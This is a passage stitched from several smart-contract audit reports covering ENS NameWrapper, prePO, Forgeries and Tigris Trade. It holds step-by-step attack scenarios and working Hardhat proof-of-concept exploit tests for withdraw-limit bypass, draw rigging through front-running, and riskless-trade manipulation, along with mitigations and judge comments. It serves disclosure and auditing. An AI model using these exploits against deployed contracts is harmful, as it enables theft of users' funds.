However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage ENSRegistry::setSubnodeOwner to re-set himself as the ENS owner of the subdomain, and thus re-invoking NameWrapper.wrap can rewrite the fuses and wrapper owner of the given subdoamin.
Considering the following attack scenario:

Someone owns a domain (or a 2LD), e.g., poc.eth
The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth
This sub-domain should not burn CANNOT_UNWRAP
This sub-domain can burn PARENT_CANNOT_CONTROL


Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth
The victim user burns arbitrary fuses, including PARENT_CANNOT_CONTROL
The hacker should not be able to change the owner and the fuses of victim.hack.poc.eth ideally


However, the hacker then unwraps his sub-domain, i.e., hack.poc.eth
The hacker invokes ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim) on the sub-sub-domain
He can reassign himself as the owner of the victim.hack.poc.eth


The hacker invokes NameWrapper.wrap(victim.hacker.poc.eth) to over-write the fuses and owner of the sub-sub-domain, i.e., victim.hacker.poc.eth

The root cause here is that, for any node, when one of its subdomains burns PARENT_CANNOT_CONTROL, the node itself fails to burn CANNOT_UNWRAP. Theoretically, this should check to the root, which however is very gas-consuming.
Suggested Fix

Potential fix 1: auto-burn CANNOT_UNWRAP which thus lets expiry decide whether a node can be unwrapped.
Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.

Proof of Concept / Attack Scenario
For full details, please see original warden submission.
Arachnid (ENS) confirmed

Medium Risk Findings (13)


## [H-01]  "griefing / blocking / delaying users to withdraw"

Submitted by zaskoh, also found by unforgiven, deliriusz, rvierdiiev, and Tricko
To withdraw, a user needs to convert his collateral for the base token. This is done in the withdraw function in Collateral.
The WithdrawHook has some security mechanics that can be activated like a global max withdraw in a specific timeframe, also for users to have a withdraw limit for them in a specific timeframe. It also collects the fees.
The check for the user withdraw is wrongly implemented and can lead to an unepexted delay for a user with a position > userWithdrawLimitPerPeriod. To withdraw all his funds he needs to be the first in every first new epoch (lastUserPeriodReset + userPeriodLength) to get his amount out. If he is not the first transaction in the new epoch, he needs to wait for a complete new epoch and depending on the timeframe from lastUserPeriodReset + userPeriodLength this can get a long delay to get his funds out.
The documentation says, that after every epoch all the user withdraws will be reset and they can withdraw the next set.
solidity
File: apps/smart-contracts/core/contracts/interfaces/IWithdrawHook.sol
63:   /**
64:    * @notice Sets the length in seconds for which user withdraw limits will
65:    * be evaluated against. Every time `userPeriodLength` seconds passes, the
66:    * amount withdrawn for all users will be reset to 0. This amount is only
But the implementation only resets the amount for the first user that interacts with the contract in the new epoch and leaves all other users with their old limit. This can lead to a delay for every user that is on his limit from a previous epoch until they manage to be the first to interact with the contract in the new epoch.
Proof of Concept
https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/WithdrawHook.sol#L66-L72
The following test shows how a user is locked out to withdraw if he's at his limit from a previous epoch and another withdraw is done before him.
apps/smart-contracts/core/test/WithdrawHook.test.ts
```node
  describe('user withdraw is delayd', () => {
    beforeEach(async () => {
      await withdrawHook.setCollateral(collateral.address)
      await withdrawHook.connect(deployer).setWithdrawalsAllowed(true)
      await withdrawHook.connect(deployer).setGlobalPeriodLength(0)
      await withdrawHook.connect(deployer).setUserPeriodLength(TEST_USER_PERIOD_LENGTH)
      await withdrawHook.connect(deployer).setGlobalWithdrawLimitPerPeriod(0)
      await withdrawHook.connect(deployer).setUserWithdrawLimitPerPeriod(TEST_USER_WITHDRAW_LIMIT)
      await withdrawHook.connect(deployer).setDepositRecord(depositRecord.address)
      await withdrawHook.connect(deployer).setTreasury(treasury.address)
      await withdrawHook.connect(deployer).setTokenSender(tokenSender.address)
      await testToken.connect(deployer).mint(collateral.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken.connect(deployer).mint(user.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken.connect(deployer).mint(user2.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken
        .connect(collateralSigner)
        .approve(withdrawHook.address, ethers.constants.MaxUint256)
      tokenSender.send.returns()
    })
it('reverts if user withdraw limit exceeded for period', async () => {

  // first withdraw with the limit amount for a user
  await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
  expect(await withdrawHook.getAmountWithdrawnThisPeriod(user.address)).to.eq(TEST_USER_WITHDRAW_LIMIT)

  // we move to a new epoch in the future
  const previousResetTimestamp = await getLastTimestamp(ethers.provider)
  await setNextTimestamp(
    ethers.provider,
    previousResetTimestamp + TEST_USER_PERIOD_LENGTH + 1
  )

  // now another user is the first one to withdraw in this new epoch      
  await withdrawHook.connect(collateralSigner).hook(user2.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
  expect(await withdrawHook.getAmountWithdrawnThisPeriod(user2.address)).to.eq(TEST_USER_WITHDRAW_LIMIT)

  // this will revert, because userToAmountWithdrawnThisPeriod[_sender] is not reset
  // but it should not revert as it's a new epoch and the user didn't withdraw yet
  await expect(
    withdrawHook.connect(collateralSigner).hook(user.address, 1, 1)
  ).to.revertedWith('user withdraw limit exceeded')

})

})
```
To get the test running you need to add let user2: SignerWithAddress and the user2 in await ethers.getSigners()
Recommended Mitigation Steps
The check how the user periods are handled need to be changed. One possible way is to change the lastUserPeriodReset to a mapping like
mapping(address => uint256) private lastUserPeriodReset to track the time for every user separately.
With a mapping you can change the condition to:
```solidity
File: apps/smart-contracts/core/contracts/WithdrawHook.sol
18:   mapping(address => uint256) lastUserPeriodReset;
File: apps/smart-contracts/core/contracts/WithdrawHook.sol
66:     if (lastUserPeriodReset[_sender] + userPeriodLength < block.timestamp) {
67:       lastUserPeriodReset[_sender] = block.timestamp;
68:       userToAmountWithdrawnThisPeriod[_sender] = _amountBeforeFee;
69:     } else {
70:       require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, "user withdraw limit exceeded");
71:       userToAmountWithdrawnThisPeriod[_sender] += _amountBeforeFee;
72:     }
```
With this change, we can change the test to how we would normaly expect the contract to work and see that it is correct.
```node
    it('withdraw limit is checked for every use seperatly', async () => {
  // first withdraw with the limit amount for a user
  await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)

  // we move to a new epoch in the future
  const previousResetTimestamp = await getLastTimestamp(ethers.provider)
  await setNextTimestamp(
    ethers.provider,
    previousResetTimestamp + TEST_USER_PERIOD_LENGTH + 1
  )

  // now another user is the first one to withdraw in this new epoch      
  await withdrawHook.connect(collateralSigner).hook(user2.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)

  // the first user also can withdraw his limit in this epoch
  await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)

  // we move the time, but stay in the same epoch
  const previousResetTimestamp2 = await getLastTimestamp(ethers.provider)
  await setNextTimestamp(
    ethers.provider,
    previousResetTimestamp2 + TEST_USER_PERIOD_LENGTH - 1
  )

  // this now will fail as we're in the same epoch
  await expect(
    withdrawHook.connect(collateralSigner).hook(user.address, 1, 1)
  ).to.revertedWith('user withdraw limit exceeded')

})

```
ramenforbreakfast (prePO) confirmed 



## [H-02]  "A whale user is able to cause freeze of funds of other users by bypassing withdraw limit"

Submitted by Trust, also found by 0Kage, imare, hansfriese, ayeslick, rvierdiiev, bin2chen, fs0c, mert_eren, Parth, cccz, aviggiano, and chaduke)
https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L61
https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L68
Description
In Collateral.sol, users may withdraw underlying tokens using withdraw. Importantly, the withdrawal must be approved by withdrawHook if set:
function withdraw(uint256 _amount) external override nonReentrant {
  uint256 _baseTokenAmount = (_amount * baseTokenDenominator) / 1e18;
  uint256 _fee = (_baseTokenAmount * withdrawFee) / FEE_DENOMINATOR;
  if (withdrawFee > 0) { require(_fee > 0, "fee = 0"); }
  else { require(_baseTokenAmount > 0, "amount = 0"); }
  _burn(msg.sender, _amount);
  uint256 _baseTokenAmountAfterFee = _baseTokenAmount - _fee;
  if (address(withdrawHook) != address(0)) {
    baseToken.approve(address(withdrawHook), _fee);
    withdrawHook.hook(msg.sender, _baseTokenAmount, _baseTokenAmountAfterFee);
    baseToken.approve(address(withdrawHook), 0);
  }
  baseToken.transfer(msg.sender, _baseTokenAmountAfterFee);
  emit Withdraw(msg.sender, _baseTokenAmountAfterFee, _fee);
}

The hook requires that two checks are passed:
if (lastGlobalPeriodReset + globalPeriodLength < block.timestamp) {
  lastGlobalPeriodReset = block.timestamp;
  globalAmountWithdrawnThisPeriod = _amountBeforeFee;
} else {
  require(globalAmountWithdrawnThisPeriod + _amountBeforeFee <= globalWithdrawLimitPerPeriod, "global withdraw limit exceeded");
  globalAmountWithdrawnThisPeriod += _amountBeforeFee;
}
if (lastUserPeriodReset + userPeriodLength < block.timestamp) {
  lastUserPeriodReset = block.timestamp;
  userToAmountWithdrawnThisPeriod[_sender] = _amountBeforeFee;
} else {
  require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, "user withdraw limit exceeded");
  userToAmountWithdrawnThisPeriod[_sender] += _amountBeforeFee;
}

If it has been less than "globalPeriodLength" seconds since the global reset, we step into the if block, reset time becomes now and starting amount is the current requested amount. Otherwise, the new amount must not overpass the globalWithdrawLimitPerPeriod. Very similar check is done for "user" variables.
The big issue here is that the limit can be easily bypassed by the first person calling withdraw in each group ("global" and "user"). It will step directly into the if block where no check is done, and fill the variable with any input amount.
As I understand, the withdraw limit is meant to make sure everyone is guaranteed to be able to withdraw the specified amount, so there is no chance of freeze of funds. However, due to the bypassing of this check, a whale user is able to empty the current reserves put in place and cause a freeze of funds for other users, until the Collateral contract is replenished.
Impact
A whale user is able to cause freeze of funds of other users by bypassing withdraw limit.
Proof of Concept

Collateral.sol has 10,000 USDC reserve
Withdraw limit is 150 USDC per user per period
There are 5 users - Alpha with collateral worth 12,000 USDC, and 4 users each with 1,000 USDC
Alpha waits for a time when request would create a new lastGlobalPeriodReset and new lastUserPeriodReset. He requests a withdraw of 10,000 USDC.
The hook is passed and he withdraws the entire collateral reserves.
At this point, victim Vic is not able to withdraw their 150 USDC. It is a freeze of funds.

Recommended Mitigation Steps
Add limit checks in the if blocks as well, to make sure the first request does not overflow the limit.
Judge note
I've confirmed with the PrePO team during the contest that withdraw limit bypass is a very serious issue.
ramenforbreakfast (prePO) confirmed 

Medium Risk Findings (7)


## [H-02]  "Draw organizer can rig the draw to favor certain participants such as their own account."

Submitted by Trust
In RandomDraw, the host initiates a draw using startDraw() or redraw() if the redraw draw expiry has passed. Actual use of Chainlink oracle is done in \_requestRoll:
request.currentChainlinkRequestId = coordinator.requestRandomWords({
 keyHash: settings.keyHash,
 subId: settings.subscriptionId,
 minimumRequestConfirmations: minimumRequestConfirmations,
 callbackGasLimit: callbackGasLimit,
 numWords: wordsRequested
});
Use of subscription API is explained well here. Chainlink VRFCoordinatorV2 is called with requestRandomWords() and emits a random request. After minimumRequestConfirmations blocks, an oracle VRF node replies to the coordinator with a provable random, which supplies the random to the requesting contract via fulfillRandomWords() call. It is important to note the role of subscription ID. This ID maps to the subscription charged for the request, in LINK tokens. In our contract, the raffle host supplies their subscription ID as a parameter. Sufficient balance check of the request ID is not checked at request-time, but rather checked in Chainlink node code as well as on-chain by VRFCoordinator when the request is satisfied. In the scenario where the subscriptionID lacks funds, there will be a period of 24 hours when user can top up the account and random response will be sent:
“Each subscription must maintain a minimum balance to fund requests from consuming contracts. If your balance is below that minimum, your requests remain pending for up to 24 hours before they expire. After you add sufficient LINK to a subscription, pending requests automatically process as long as they have not expired.”
The reason this is extremely interesting is because as soon as redraws are possible, the random response can no longer be treated as fair. Indeed, Draw host can wait until redraw cooldown passed (e.g. 1 hour), and only then fund the subscriptionID. At this point, Chainlink node will send a TX with the random response. If host likes the response (i.e. the draw winner), they will not interfere. If they don’t like the response, they can simply frontrun the Chainlink TX with a redraw() call. A redraw will create a new random request and discard the old requestId so the previous request will never be accepted.
function fulfillRandomWords(
 uint256 \_requestId,
 uint256[] memory \_randomWords
) internal override {
 // Validate request ID
 // <---------------- swap currentChainlinkRequestId --->
 if (\_requestId != request.currentChainlinkRequestId) {
 revert REQUEST\_DOES\_NOT\_MATCH\_CURRENT\_ID();
 }
 ...
}
//<------ redraw swaps currentChainlinkRequestId --->
request.currentChainlinkRequestId = coordinator.requestRandomWords({
 keyHash: settings.keyHash,
 subId: settings.subscriptionId,
 minimumRequestConfirmations: minimumRequestConfirmations,
 callbackGasLimit: callbackGasLimit,
 numWords: wordsRequested
});
Chainlink docs warn against this usage pattern of the VRF -“Don’t accept bids/bets/inputs after you have made a randomness request”. In this instance, a low subscription balance allows the host to invalidate the assumption that 1 hour redraw cooldown is enough to guarantee Chainlink answer has been received.
Impact
Draw organizer can rig the draw to favor certain participants such as their own account.
Proof of Concept
Owner offers a BAYC NFT for holders of their NFT collection X. Out of 10,000 tokenIDs, owner has 5,000 Xs. Rest belongs to retail users.

Owner subscriptionID is left with 0 LINK balance in coordinator
Redraw time is set to 2 hours
Owner calls startDraw() which will initiate a Chainlink request
Owner waits for 2 hours and then tops up their subscriptionID with sufficient LINK
Owner scans the mempool for fulfillRandomWords()

If the raffle winner is tokenID < 5000, it is owner’s token

Let fulfill execute and pick up the reward

If tokenID >= 5000


Call redraw()

fulfill will revert because of requestId mismatch
Owner has 75% of claiming the NFT instead of 50%



Note that Forgeries draws are presumably intended as incentives for speculators to buy NFTs from specific collections. Without having a fair shot at receiving rewards from raffles, these NFTs user buys could be worthless. Another way to look at it is that the impact is theft of yield, as host can freely decrease the probability that a token will be chosen for rewards with this method.
Also, I did not categorize it as centralization risk as the counterparty is not Forgeries but rather some unknown third-party host which offers an NFT incentive program. It is a similar situation to the distinction made between 1st party and 3rd party projects here.
Tools Used
Chainlink docs
Chainlink co-ordinator code
Recommended Mitigation Steps
The root cause is that Chainlink response can arrive up to 24 hours from the most request is dispatched, while redraw cooldown can be 1 hour+. The best fix would be to enforce minimum cooldown of 24 hours.
iainnash (Forgeries) confirmed
gzeon (judge) decreased severity to Medium and commented:

This issue weaponized 133 and 194 to violate the fairness requirement of the protocol. Downgrading this to Medium because the 

Difficulty of attack is high; you need to
a) front-run the fulfillRandomWords call and
b) own a meaningful % of the collection
Require to use an underfunded subscription
This will flag the raffle is fishy, since the owner might as well never fund the subscription.
3rd party can mitigate this by funding the subscription.

There is another case where the chainlink node waits almost 24 hours before fulfilling the request, but I don’t think that is the normal behavior and is out of the attacker’s control.

Trust (warden) commented:

Would like to respectfully state my case and why this finding is clearly HIGH impact.
Manipulation of RNG is an extremely serious impact as it undermines assumption of fairness which is the main selling point of raffles, lotteries etc. As proof one can view Chainlink’s  BBP which lists “Predictable or manipulable RNG that results in abuse of downstream services” as a critical impact, payable up to $3M.
I would like to relate to the conditions stated by the judge:


Difficulty of attack is high; you need to
a) front-run the fulfillRandomWords call and
b) own a meaningful % of the collection


frontrunning is done in practically every block by MEV bots proving it’s practical and easy to do on mainnet, where the protocol is deployed. Owning a meaningful % of the collection is not necessary, as:

Even with 1 / 10,000 NFTs, owner is still multiplying their chances which is a breach of fair random.
The exploit can be repeated in every single raffle, exponentially multiplying their edge across time. This also highlights that the frontrunning does not have to be work every time (even though it’s high %) in order for the exploitation to work.
The draw is chosen by ownership of _settings.drawingToken, which is a project-provided token which is already likely they have a large amount of. It is unrelated to the BAYC collection / high value NFT being given out.
It is easy to see attacker can easily half the chances of any unwanted recipient to win the raffle - they would have to have the winning ticket in both rounds. Putting the subscriber’s boosted win chances aside, it’s a clear theft of user’s potential high value prize.



Require to use an underfunded subscription
This will flag the raffle is fishy, since the owner might as well never fund the subscription.
3rd party can mitigate this by funding the subscription


It is unrealistic to expect users of the protocol to be savvy on-chain detectives and also anticipate this specific attack vector. Even so, the topping-up of the subscription is done directly subscriber -> ChainlinkVRFCoordinator, so it’s not visible by looking at the raffle contract. 
To summarize, the characteristics of this finding are much more aligned to those of High severity, than those of Medium severity.

gzeon (judge) commented:

The difficulty arises when only the raffle creator can perform the front running, not any interested MEV searcher. For sure, this is only 1 of the reason I think the risk of this issue is not High.
As the project seems to be fine with a raffle being created, but never actually started; I think when the attack require a chainlink subscription to be underfunded to begin with also kinda fall in to the “creator decided not to start raffle” category.
The argument of judging this apart from that is the raffle would looks like it completed but might not be fair, which I think is a very valid issue. However, I don’t see this as High risk given the relative difficulty as said and we seems to agree that it is fine if the raffle creator decided not to start the raffle. The end state would basically be the same.

Trust (warden) commented:

The end states are in my opinion very different. In order to understand the full impact of the vulnerability we need to understand the context in which those raffles take place. The drawing tokens are shilled to give users a chance to win a high valued item. Their worth is correlated to the fair chance users think they have in winning the raffle. The “fake raffle” on display allows the attacker to keep profiting from ticket sales while not giving away high value. I think this is why
@iainnash agreed this to be a high risk find. 
I’ve also listed several other justifications including theft of user’s chances of winning which is high impact. I’d be happy to provide additional proof of why frontrunning is easily high enough % if that is the source of difficulty observed.

gzeon (judge) commented:


The drawing tokens are shilled to give users a chance to win a high valued item. Their worth is correlated to the fair chance users think they have in winning the raffle. 

That’s my original thought, but you and the sponsor tried to convince me the raffle is permissioned by design considering startDraw. 
If we think we need to guarantee the raffle token can get something fairly, we will also need to guarantee the raffle will, well, start. So I would say these are very similar since the ticket would be already sold anyway.
I think I might either keep everything as-is, or I am going to reinstate those other issues that I invalidated due to assuming the permissioned design, and upgrading this to High. Would love to hear more from the sponsor before making the final call.

Trust (warden) commented:

Regarding your smart observation @gzeon , I think the idea is clearly to make the draw methods decentralized in the future, but owner controlled as a first step. However they were not aware of this exploit, which from day 1 allows to put on a show and drive draw token prices up.

gzeon (judge) increased severity to High and commented:

#359 (comment)


Medium Risk Findings (3)


## [H-02]  "Riskless trades due to delay check"

Submitted by Bobface
Trading.limitClose() uses _checkDelay(). This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.
Detailed description
A malicious trader can exploit the Trading contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.
The exploit is based on three principles:

The stop-loss of a position can be updated without any delay checks, due to _checkDelay() not being called in updateTpSl()
Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to limitClose calling _checkDelay()
The block delay can be continuously renewed for a negligible cost

Based on these three principles, the following method can be used to perform riskless trades:
Assuming a current market price of 1,000 DAI, begin by opening a long limit order through initiateLimitOrder() at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through executeLimitOrder.
After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call limitClose. However, we can prevent them from doing so by continuously calling addToPosition with 1 wei when the block delay comes close to running out [1], which will renew the delay and thus stops limitClose from being called.
While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:

If the price goes down, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through liquidatePosition(). If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.
If the price goes up, the trader calls updateTpSl() to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls updateTpSl() with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to _checkDelay().

The trader keeps calling updateTpSl() when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls limitClose() to close the order at the peak stop-loss.
Notes
[1]: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to addToPosition after every few transactions on the chain. However, block.number, which is used by the contract, actually returns the L1 block number and not the L2 block number.
Recommended Mitigation Steps
The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in limitClose() should be modified to also consider whether the position is below the stop-loss.
Proof of Concept
Insert the following code as test into test/07.Trading.js and run it with npx hardhat test test/07.Trading.js:
```javascript
describe("PoC", function () {
    it.only("PoC", async function () {
      // Setup token balances and approvals
      const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)
      await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))
      await mockDAI.connect(owner).transfer(stablevault.address, parseEther("100000"))
      await mockDAI.connect(user).approve(trading.address, parseEther("10000"))
      const daiAtBeginning = await mockDAI.balanceOf(user.address)
      const permitData = [
        "0",
        "0",
        "0",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        false
      ]
  // Setup block delay to 5 blocks
  const blockDelay = 5;
  await trading.connect(owner).setBlockDelay(blockDelay)




  // ============================================================== //
  // =================== Create the limit order =================== //
  // ============================================================== //
  const tradeInfo = [
    parseEther("9000"),       // margin amount
    MockDAI.address,          // margin asset
    StableVault.address,      // stable vault
    parseEther("2"),          // leverage
    0,                        // asset id
    true,                     // direction (long)
    parseEther("0"),          // take profit price
    parseEther("1000"),       // stop loss price
    ethers.constants.HashZero // referral
  ];

  // Create the order
  await trading.connect(user).initiateLimitOrder(
    tradeInfo,            // trade info
    1,                    // order type (limit)
    parseEther("1000"),   // price
    permitData,           // permit
    user.address          // trader
  )



  // ============================================================== //
  // =================== Execute the limit order ================== //
  // ============================================================== //

  // Wait for some blocks to pass the delay
  await network.provider.send("evm_increaseTime", [10])
  for (let n = 0; n < blockDelay; n++) {
    await network.provider.send("evm_mine")
  }

  // Create the price data (the price hasn't changed)
  let priceData = [
    node.address,                                   // provider
    0,                                              // asset id
    parseEther("1000"),                             // price
    10000000,                                       // spread (0.1%)
    (await ethers.provider.getBlock()).timestamp,   // timestamp
    false                                           // is closed
  ]

  // Sign the price data
  let message = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
      [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
    )
  );
  let sig = await node.signMessage(
    Buffer.from(message.substring(2), 'hex')
  )

  // Execute the limit order
  await trading.connect(user).executeLimitOrder(1, priceData, sig);






  // ============================================================== //
  // ================== Block bots from closing =================== //
  // ============================================================== //

  for (let i = 0; i < 5; i++) {

    /*
      This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.
      We constantly add 1 wei to the position when the delay is close to running out.
      This won't change anything about our position, but it will reset the delay timer,
      stopping bots from calling `limitClose()`.

      This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.
      And if the price rises, we can push the stop loss higher to keep profits.

      The loop runs five times just to demonstrate. In reality, this could be done as long as needed.
    */


    // Blocks advanced to one block before the delay would pass
    await network.provider.send("evm_increaseTime", [10])
    for (let n = 0; n < blockDelay - 1; n++) {
      await network.provider.send("evm_mine")
    }




    // ============================================================== //
    // =========== Add 1 wei to position (price is down)  =========== //
    // ============================================================== //

    // Increase delay by calling addToPosition with 1 wei
    // Create the price data
    priceData = [
      node.address,                                   // provider
      0,                                              // asset id
      parseEther("900"),                              // price
      10000000,                                       // spread (0.1%)
      (await ethers.provider.getBlock()).timestamp,   // timestamp
      false                                           // is closed
    ]

    // Sign the price data - 
    message = ethers.utils.keccak256(
      ethers.utils.defaultAbiCoder.encode(
        ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
        [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
      )
    );
    sig = await node.signMessage(
      Buffer.from(message.substring(2), 'hex')
    )

    // Add to position
    await trading.connect(user).addToPosition(
      1,
      "1",
      priceData,
      sig,
      stablevault.address,
      MockDAI.address,
      permitData,
      user.address,
    )



    // ============================================================== //
    // ====================== Bots cannot close ===================== //
    // ============================================================== //

    // Bots cannot close the position even if the price is down below the stop loss
    await expect(trading.connect(user).limitClose(
      1,          // id
      false,      // take profit
      priceData,  // price data
      sig,        // signature
    )).to.be.revertedWith("0") // checkDelay

    // They can also not liquidate the position because the price is not down enough
    // If the price falls close to the liquidation zone, we can add more margin or simply close
    // the position, netting us the stop-loss price.
    await expect(trading.connect(user).liquidatePosition(
      1,          // id
      priceData,  // price data
      sig,        // signature
    )).to.be.reverted




    // ============================================================== //
    // =============== Increase SL when price is up  ================ //
    // ============================================================== //

    // Sign the price data (price has 5x'ed from initial price)
    priceData = [
      node.address,                                   // provider
      0,                                              // asset id
      parseEther("5000"),                             // price
      10000000,                                       // spread (0.1%)
      (await ethers.provider.getBlock()).timestamp,   // timestamp
      false                                           // is closed
    ]
    message = ethers.utils.keccak256(
      ethers.utils.defaultAbiCoder.encode(
        ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
        [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
      )
    );
    sig = await node.signMessage(
      Buffer.from(message.substring(2), 'hex')
    )

    // Update stop loss right at the current price
    await trading.connect(user).updateTpSl(
      false,                // type (sl)
      1,                    // id
      parseEther("5000"),   // sl price
      priceData,            // price data
      sig,                  // signature
      user.address,        // trader
    )
  }





  // ============================================================== //
  // ======================== Close order  ======================== //
  // ============================================================== //

  // When we are happy with the profit, we stop increasing the delay and close the position

  // Wait for some blocks to pass the delay
  await network.provider.send("evm_increaseTime", [10])
  for (let n = 0; n < blockDelay; n++) {
    await network.provider.send("evm_mine")
  }

  // Close order
  await trading.connect(user).limitClose(
    1,          // id
    false,      // take profit
    priceData,  // price data
    sig,        // signature
  )

  // Withdraw to DAI
  const amount = await stabletoken.balanceOf(user.address)
  await stablevault.connect(user).withdraw(MockDAI.address, amount)

  // Print results
  const daiAtEnd = await mockDAI.balanceOf(user.address)
  const tenPow18 = "1000000000000000000"
  const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18
  console.log(`Profit: ${diff} DAI`)
})

})
```
GainsGoblin (Tigris Trade) confirmed 
Alex the Entreprenerd (judge) commented:

The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.
Because of the broken invariants, and the value extraction shown, I agree with High Severity.

GainsGoblin (Tigris Trade) resolved:

Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125 




## [H-04]  "Bypass the maximum PnL check to take extra profit"

Submitted by KingNFT
To protect the fund of vault, the protocol has a security mechanism which limits:
Maximum PnL is +500%.

source: https://docs.tigris.trade/protocol/trading-and-fees#limitations
But the implementation is missing to check this limitation while addToPosition(), an attacker can exploit it to get more profit than expected.
Proof of Concept
The following test case shows both normal case and the exploit scenario.
In the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.
In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.
```
const { expect } = require("chai");
const { deployments, ethers, waffle } = require("hardhat");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');
const exp = require("constants");
describe("Design Specification: Maximum PnL is +500%", function () {
let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;
let Trading;
  let trading;
let TradingExtension;
  let tradingExtension;
let TradingLibrary;
  let tradinglibrary;
let StableToken;
  let stabletoken;
let StableVault;
  let stablevault;
let position;
let pairscontract;
  let referrals;
let permitSig;
  let permitSigUsdc;
let MockDAI;
  let mockdai;
  let MockUSDC;
  let mockusdc;
let badstablevault;
let chainlink;
beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get("StableToken");
    stabletoken = await ethers.getContractAt("StableToken", StableToken.address);
    Trading = await deployments.get("Trading");
    trading = await ethers.getContractAt("Trading", Trading.address);
    await trading.connect(owner).setMaxWinPercent(5e10);
    TradingExtension = await deployments.get("TradingExtension");
    tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);
    const Position = await deployments.get("Position");
    position = await ethers.getContractAt("Position", Position.address);
    MockDAI = await deployments.get("MockDAI");
    mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);
    MockUSDC = await deployments.get("MockUSDC");
    mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);
    const PairsContract = await deployments.get("PairsContract");
    pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);
    const Referrals = await deployments.get("Referrals");
    referrals = await ethers.getContractAt("Referrals", Referrals.address);
    StableVault = await deployments.get("StableVault");
    stablevault = await ethers.getContractAt("StableVault", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);
    await network.provider.send("evm_mine");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);
const BadStableVault = await ethers.getContractFactory("BadStableVault");
